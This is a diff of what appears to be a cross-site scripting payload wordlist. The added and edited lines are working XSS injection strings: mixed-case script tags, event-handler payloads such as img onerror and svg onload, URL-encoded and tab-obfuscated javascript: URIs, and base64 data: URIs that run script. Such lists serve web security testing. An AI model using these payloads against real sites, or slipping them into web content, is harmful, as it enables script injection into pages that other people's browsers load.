@@ -1,16 +1,17 @@
+<script>alert("123")</script>
 <script>alert('XSSYA')</script>
 1<ScRiPt >prompt(962477)</sCripT>
 <script>alert('xssya')</script>
-'';!--\ <XSS>=&{()}
+'';!--\<XSS>=&{()}
 <ScRipt>ALeRt('xssya');</sCRipT>
 <body/onhashchange=alert(1)><a href=#>clickit
 <img src=x onerror=prompt(1);>
 %3cvideo+src%3dx+onerror%3dprompt(1)%3b%3e
-<iframesrc=\ javascript:alert(2)\ >
-<iframe/src=\ data:text&sol;html;&Tab;base64&NewLine; PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\ >
-<form action=\ Javascript:alert(1)\ ><input type=submit>
-<isindex action=data:text/html  type=image>
-<object data=\ data:text/html;base64 PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\ >
+<iframesrc=\javascript:alert(2)\>
+<iframe/src=\data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\>
+<form action=\Javascript:alert(1)\><input type=submit>
+<isindex action=data:text/html, type=image>
+<object data=\data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\>
 <svg/onload=prompt(1);>
 <marquee/onstart=confirm(2)>/
 <body onload=prompt(1);>
@@ -23,5 +24,5 @@
 5\x72\x74\x28\x30\x29\x3B'>rhainfosec
 <isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
 <marquee/onstart=confirm(2)>
-<A HREF=\ http://www.google.com./\ >XSS</A>
- <svg/onload=prompt(1);>
+<A HREF=\http://www.google.com./\>XSS</A>
+<svg/onload=prompt(1);>
